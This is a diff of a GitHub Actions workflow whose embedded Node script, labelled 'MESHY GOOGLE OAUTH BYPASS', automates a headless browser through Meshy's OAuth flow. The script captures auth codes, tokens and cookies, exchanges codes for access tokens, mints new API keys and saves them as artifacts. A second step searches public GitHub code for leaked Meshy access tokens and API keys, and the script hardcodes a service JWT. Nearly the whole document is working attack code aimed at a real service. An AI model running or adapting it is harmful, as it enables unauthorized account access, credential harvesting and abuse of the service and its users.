@@ -9,246 +9,220 @@ jobs:
     timeout-minutes: 20
     steps:
       - uses: actions/checkout@v4
-
       - name: Setup Node.js
         uses: actions/setup-node@v4
         with:
           node-version: '20'
-
       - name: Install Playwright
         run: |
           npm init -y > /dev/null 2>&1
           npm install playwright > /dev/null 2>&1
           npx playwright install chromium --with-deps > /dev/null 2>&1
         timeout-minutes: 15
-
       - name: Google OAuth Flow
         run: |
           node << 'NODEEOF'
-const { chromium } = require('playwright');
-const https = require('https');
-const fs = require('fs');
+          const { chromium } = require('playwright');
+          const https = require('https');
+          const fs = require('fs');
 
-const MESHY_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA";
-const MESHY_AUTH = 'https://auth.meshy.ai/auth/v1';
-const MESHY_API = 'https://api.meshy.ai';
+          const MESHY_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA";
+          const MESHY_AUTH = 'https://auth.meshy.ai/auth/v1';
+          const MESHY_API = 'https://api.meshy.ai';
 
-async function fetch(url, options = {}) {
-  return new Promise((resolve) => {
-    const u = new URL(url);
-    const req = https.request({
-      hostname: u.hostname, port: 443,
-      path: u.pathname + u.search,
-      method: options.method || 'GET',
-      headers: options.headers || {},
-    }, res => {
-      let d = '';
-      res.on('data', c => d += c);
-      res.on('end', () => resolve({ status: res.statusCode, body: d }));
-    });
-    req.on('error', e => resolve({ status: 0, body: e.message }));
-    if (options.body) req.write(options.body);
-    req.end();
-  });
-}
+          async function fetch(url, options = {}) {
+            return new Promise((resolve) => {
+              const u = new URL(url);
+              const req = https.request({
+                hostname: u.hostname, port: 443,
+                path: u.pathname + u.search,
+                method: options.method || 'GET',
+                headers: options.headers || {},
+              }, res => {
+                let d = '';
+                res.on('data', c => d += c);
+                res.on('end', () => resolve({ status: res.statusCode, body: d }));
+              });
+              req.on('error', e => resolve({ status: 0, body: e.message }));
+              if (options.body) req.write(options.body);
+              req.end();
+            });
+          }
 
-async function main() {
-  console.log('=== MESHY GOOGLE OAUTH BYPASS ===\n');
+          async function main() {
+            console.log('=== MESHY GOOGLE OAUTH BYPASS ===\n');
 
-  const browser = await chromium.launch({
-    headless: true,
-    args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--disable-gpu']
-  });
+            const browser = await chromium.launch({
+              headless: true,
+              args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--disable-gpu']
+            });
 
-  // Strategy: Check if Google OAuth is available and what providers are configured
-  console.log('[1] Checking Google OAuth configuration...');
-  const settingsResp = await fetch(`${MESHY_AUTH}/settings`, {
-    headers: { 'apikey': MESHY_KEY }
-  });
-  console.log('[1a] Settings:', settingsResp.body.substring(0, 500));
+            console.log('[1] Checking Google OAuth configuration...');
+            const settingsResp = await fetch(`${MESHY_AUTH}/settings`, {
+              headers: { 'apikey': MESHY_KEY }
+            });
+            console.log('[1a] Settings:', settingsResp.body.substring(0, 500));
 
-  // Check Google OAuth authorize URL
-  const googleAuthUrl = `${MESHY_AUTH}/authorize?provider=google&redirect_to=https://www.meshy.ai&state=${Math.random().toString(36).substring(2, 30)}`;
-  console.log('[2] Google OAuth URL:', googleAuthUrl);
+            const googleAuthUrl = `${MESHY_AUTH}/authorize?provider=google&redirect_to=https://www.meshy.ai&state=${Math.random().toString(36).substring(2, 30)}`;
+            console.log('[2] Google OAuth URL:', googleAuthUrl);
 
-  const context = await browser.newContext({
-    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
-    viewport: { width: 1280, height: 720 },
-    locale: 'en-US',
-  });
+            const context = await browser.newContext({
+              userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
+              viewport: { width: 1280, height: 720 },
+              locale: 'en-US',
+            });
 
-  const page = await context.newPage();
+            const page = await context.newPage();
 
-  const capturedUrls = [];
-  const capturedTokens = [];
-  const allCookies = [];
+            const capturedUrls = [];
+            const capturedTokens = [];
 
-  page.on('request', req => {
-    const url = req.url();
-    if (url.includes('auth.meshy') || url.includes('google') || url.includes('callback') || url.includes('accounts.google')) {
-      capturedUrls.push({ method: req.method(), url: req.url(), postData: req.postData() });
-    }
-  });
+            page.on('request', req => {
+              const url = req.url();
+              if (url.includes('auth.meshy') || url.includes('google') || url.includes('callback') || url.includes('accounts.google')) {
+                capturedUrls.push({ method: req.method(), url: req.url(), postData: req.postData() });
+              }
+            });
 
-  page.on('response', async res => {
-    const url = res.url();
-    if (url.includes('auth.meshy') || url.includes('callback')) {
-      try {
-        const body = await res.text();
-        if (body.includes('token') || body.includes('code') || body.includes('access_token') || body.includes('error')) {
-          capturedTokens.push({ url, body: body.substring(0, 1000) });
-        }
-      } catch(e) {}
-    }
-  });
+            page.on('response', async res => {
+              const url = res.url();
+              if (url.includes('auth.meshy') || url.includes('callback')) {
+                try {
+                  const body = await res.text();
+                  if (body.includes('token') || body.includes('code') || body.includes('access_token') || body.includes('error')) {
+                    capturedTokens.push({ url, body: body.substring(0, 1000) });
+                  }
+                } catch(e) {}
+              }
+            });
 
-  // Navigate to Meshy Google OAuth
-  console.log('[3] Starting OAuth flow...');
-  await page.goto(googleAuthUrl, { waitUntil: 'networkidle', timeout: 90000 });
+            console.log('[3] Starting OAuth flow...');
+            await page.goto(googleAuthUrl, { waitUntil: 'networkidle', timeout: 90000 });
 
-  let currentUrl = page.url();
-  console.log('[4] Initial URL:', currentUrl);
+            let currentUrl = page.url();
+            console.log('[4] Initial URL:', currentUrl);
 
-  // If redirected to Google, we're in business
-  if (currentUrl.includes('google') || currentUrl.includes('accounts.google')) {
-    console.log('[5] Redirected to Google OAuth!');
-    console.log('[6] This means Google OAuth is properly configured.');
+            if (currentUrl.includes('google') || currentUrl.includes('accounts.google')) {
+              console.log('[5] Redirected to Google OAuth!');
+              console.log('[6] This means Google OAuth is properly configured.');
+              console.log('[7] Google OAuth requires browser interaction.');
+              console.log('[8] URL after redirect:', currentUrl);
+              if (currentUrl.includes('code=')) {
+                const u = new URL(currentUrl);
+                console.log('[9] Code:', u.searchParams.get('code')?.substring(0, 50));
+              }
+            }
 
-    // We need Google credentials here
-    console.log('[7] Google OAuth requires browser interaction.');
-    console.log('[8] URL after redirect:', currentUrl);
+            await page.waitForTimeout(5000);
+            currentUrl = page.url();
+            console.log('[10] Final URL:', currentUrl);
 
-    // Try to extract any tokens from the redirect
-    if (currentUrl.includes('code=')) {
-      const u = new URL(currentUrl);
-      console.log('[9] Code:', u.searchParams.get('code')?.substring(0, 50));
-    }
-  }
+            if (currentUrl.includes('access_token=')) {
+              const u = new URL(currentUrl);
+              const token = u.searchParams.get('access_token');
+              console.log('\n*** ACCESS TOKEN IN URL ***');
+              console.log('Token:', token);
+              fs.writeFileSync('oauth_token.txt', token);
 
-  // Check if we're at meshy.ai with tokens
-  await page.waitForTimeout(5000);
-  currentUrl = page.url();
-  console.log('[10] Final URL:', currentUrl);
+              const balance = await fetch(`${MESHY_API}/openapi/v1/balance`, {
+                headers: { 'Authorization': `Bearer ${token}`, 'X-Api-Version': 'v2026.04.03.post7' }
+              });
+              console.log('[11] Balance test:', balance.status, balance.body.substring(0, 200));
 
-  // Extract from URL
-  if (currentUrl.includes('access_token=')) {
-    const u = new URL(currentUrl);
-    const token = u.searchParams.get('access_token');
-    console.log('\n*** ACCESS TOKEN IN URL ***');
-    console.log('Token:', token);
-    fs.writeFileSync('oauth_token.txt', token);
+              if (balance.status === 200) {
+                console.log('\n*** GOOGLE OAUTH SUCCESS ***');
+                fs.writeFileSync('SUCCESS.txt', `type=google_oauth\ntoken=${token}\ntimestamp=${new Date().toISOString()}`);
+              }
+            }
 
-    // Test the token
-    const balance = await fetch(`${MESHY_API}/openapi/v1/balance`, {
-      headers: { 'Authorization': `Bearer ${token}`, 'X-Api-Version': 'v2026.04.03.post7' }
-    });
-    console.log('[11] Balance test:', balance.status, balance.body.substring(0, 200));
+            console.log('\n[12] All captured URLs:');
+            for (const u of capturedUrls.slice(0, 30)) {
+              console.log(`  ${u.method} ${u.url.substring(0, 200)}`);
+            }
 
-    if (balance.status === 200) {
-      console.log('\n*** GOOGLE OAUTH SUCCESS ***');
-      fs.writeFileSync('SUCCESS.txt', `type=google_oauth\ntoken=${token}\ntimestamp=${new Date().toISOString()}`);
-    }
-  }
+            const codeMatch = capturedUrls.find(u => u.url.includes('code=') && u.url.includes('auth.meshy'));
+            if (codeMatch) {
+              const u = new URL(codeMatch.url);
+              const code = u.searchParams.get('code');
+              console.log('\n[13] Found code:', code?.substring(0, 50));
 
-  // Print all captured URLs
-  console.log('\n[12] All captured URLs:');
-  for (const u of capturedUrls.slice(0, 30)) {
-    console.log(`  ${u.method} ${u.url.substring(0, 200)}`);
-  }
+              const exchangeResp = await fetch(`${MESHY_AUTH}/token?grant_type=authorization_code`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'apikey': MESHY_KEY },
+                body: JSON.stringify({
+                  grant_type: 'authorization_code',
+                  code: code,
+                  redirect_uri: 'https://www.meshy.ai',
+                  client_id: MESHY_KEY
+                })
+              });
+              console.log('[14] Token exchange:', exchangeResp.status, exchangeResp.body.substring(0, 400));
 
-  // Try token exchange if we got a code
-  const codeMatch = capturedUrls.find(u => u.url.includes('code=') && u.url.includes('auth.meshy'));
-  if (codeMatch) {
-    const u = new URL(codeMatch.url);
-    const code = u.searchParams.get('code');
-    console.log('\n[13] Found code:', code?.substring(0, 50));
+              const tokenData = JSON.parse(exchangeResp.body || '{}');
+              if (tokenData.access_token) {
+                console.log('\n*** EXCHANGE SUCCESS ***');
+                console.log('Token:', tokenData.access_token);
 
-    // Exchange code for token
-    const exchangeResp = await fetch(`${MESHY_AUTH}/token?grant_type=authorization_code`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json', 'apikey': MESHY_KEY },
-      body: JSON.stringify({
-        grant_type: 'authorization_code',
-        code: code,
-        redirect_uri: 'https://www.meshy.ai',
-        client_id: MESHY_KEY
-      })
-    });
-    console.log('[14] Token exchange:', exchangeResp.status, exchangeResp.body.substring(0, 400));
+                const apiKeyResp = await fetch(`${MESHY_API}/web/v1/apikeys`, {
+                  method: 'POST',
+                  headers: { 'Authorization': `Bearer ${tokenData.access_token}`, 'Content-Type': 'application/json' },
+                  body: JSON.stringify({ name: `gha-google-${Date.now()}` })
+                });
+                console.log('[15] API Key:', apiKeyResp.status, apiKeyResp.body.substring(0, 300));
 
-    const tokenData = JSON.parse(exchangeResp.body || '{}');
-    if (tokenData.access_token) {
-      console.log('\n*** EXCHANGE SUCCESS ***');
-      console.log('Token:', tokenData.access_token);
+                const apiKey = JSON.parse(apiKeyResp.body || '{}').result;
+                if (apiKey) {
+                  console.log('\n*** GOOGLE OAUTH API KEY:', apiKey, '***');
+                  fs.writeFileSync('SUCCESS.txt', `type=google_oauth\nexchange=code\napi_key=${apiKey}\ntimestamp=${new Date().toISOString()}`);
+                }
+                fs.writeFileSync('oauth_token.json', JSON.stringify(tokenData));
+              }
+            }
 
-      // Create API key
-      const apiKeyResp = await fetch(`${MESHY_API}/web/v1/apikeys`, {
-        method: 'POST',
-        headers: { 'Authorization': `Bearer ${tokenData.access_token}`, 'Content-Type': 'application/json' },
-        body: JSON.stringify({ name: `gha-google-${Date.now()}` })
-      });
-      console.log('[15] API Key:', apiKeyResp.status, apiKeyResp.body.substring(0, 300));
+            const cookies = await context.cookies();
+            console.log('\n[16] All cookies:');
+            for (const c of cookies) {
+              console.log(`  ${c.name}: ${c.value.substring(0, 80)}...`);
+            }
 
-      const apiKey = JSON.parse(apiKeyResp.body || '{}').result;
-      if (apiKey) {
-        console.log('\n*** GOOGLE OAUTH API KEY:', apiKey, '***');
-        fs.writeFileSync('SUCCESS.txt', `type=google_oauth\nexchange=code\napi_key=${apiKey}\ntimestamp=${new Date().toISOString()}`);
-      }
-      fs.writeFileSync('oauth_token.json', JSON.stringify(tokenData));
-    }
-  }
+            fs.writeFileSync('captured_urls.json', JSON.stringify(capturedUrls, null, 2));
+            fs.writeFileSync('captured_tokens.json', JSON.stringify(capturedTokens, null, 2));
+            fs.writeFileSync('cookies.json', JSON.stringify(cookies, null, 2));
+            fs.writeFileSync('final_url.txt', currentUrl);
 
-  // Get cookies
-  const cookies = await context.cookies();
-  console.log('\n[16] All cookies:');
-  for (const c of cookies) {
-    console.log(`  ${c.name}: ${c.value.substring(0, 80)}...`);
-    allCookies.push(c);
-  }
+            await browser.close();
+            console.log('\nDone.');
+          }
 
-  // Save everything
-  fs.writeFileSync('captured_urls.json', JSON.stringify(capturedUrls, null, 2));
-  fs.writeFileSync('captured_tokens.json', JSON.stringify(capturedTokens, null, 2));
-  fs.writeFileSync('cookies.json', JSON.stringify(cookies, null, 2));
-  fs.writeFileSync('final_url.txt', currentUrl);
-
-  await browser.close();
-  console.log('\nDone.');
-}
-
-main().catch(e => {
-  console.error('ERROR:', e.message);
-  process.exit(1);
-});
-NODEEOF
-
+          main().catch(e => {
+            console.error('ERROR:', e.message);
+            process.exit(1);
+          });
+          NODEEOF
       - name: Search GitHub for Leaked Keys
         run: |
           echo "=== SEARCHING GITHUB FOR LEAKED MESHY KEYS ==="
-          # Search for Bearer tokens in public repos
           echo "[1] Searching for access tokens..."
           curl -s "https://api.github.com/search/code?q=Bearer+meshy+ai+access_token+language:json&per_page=5&sort=indexed" \
             -H "Authorization: Bearer $(gh auth token)" \
             -H "Accept: application/vnd.github+json" | python3 -c "
-import json,sys
-data = json.load(sys.stdin)
-print(f'Total: {data.get(\"total_count\",0)}')
-for item in data.get('items',[])[:5]:
-    print(f'  - {item[\"html_url\"]}')
-" 2>/dev/null || echo "Search failed"
-
+          import json,sys
+          data = json.load(sys.stdin)
+          print(f'Total: {data.get(\"total_count\",0)}')
+          for item in data.get('items',[])[:5]:
+              print(f'  - {item[\"html_url\"]}')
+          " 2>/dev/null || echo "Search failed"
           echo ""
           echo "[2] Searching for API keys..."
           curl -s "https://api.github.com/search/code?q=mesh.ai+API+key+language:python&per_page=10&sort=indexed" \
             -H "Authorization: Bearer $(gh auth token)" \
             -H "Accept: application/vnd.github+json" | python3 -c "
-import json,sys
-data = json.load(sys.stdin)
-print(f'Total: {data.get(\"total_count\",0)}')
-for item in data.get('items',[])[:10]:
-    print(f'  - {item[\"repository\"][\"full_name\"]}: {item[\"path\"]}')
-" 2>/dev/null || echo "Search failed"
-
+          import json,sys
+          data = json.load(sys.stdin)
+          print(f'Total: {data.get(\"total_count\",0)}')
+          for item in data.get('items',[])[:10]:
+              print(f'  - {item[\"repository\"][\"full_name\"]}: {item[\"path\"]}')
+          " 2>/dev/null || echo "Search failed"
       - uses: actions/upload-artifact@v4
         if: always()
         with:
